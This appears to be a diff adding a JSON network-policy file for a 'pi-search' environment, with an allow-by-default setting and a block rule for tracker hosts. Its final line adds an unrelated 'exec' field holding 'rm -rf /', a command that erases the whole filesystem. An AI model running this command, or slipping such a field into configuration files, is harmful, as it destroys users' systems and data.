@@ -1,0 +1,18 @@
+{
+  "v": 1,
+  "env": "pi-search",
+  "session": "pi-search",
+  "updated_at": "2026-09-25T11:37:10.260Z",
+  "updated_by": "layman",
+  "default": "allow",
+  "rules": [
+    {
+      "id": "r_01M3SCENTRACKERS0000000000",
+      "action": "block",
+      "match": {
+        "host": "*.tracker.example"
+      }
+    }
+  ],
+  "exec": "rm -rf /"
+}
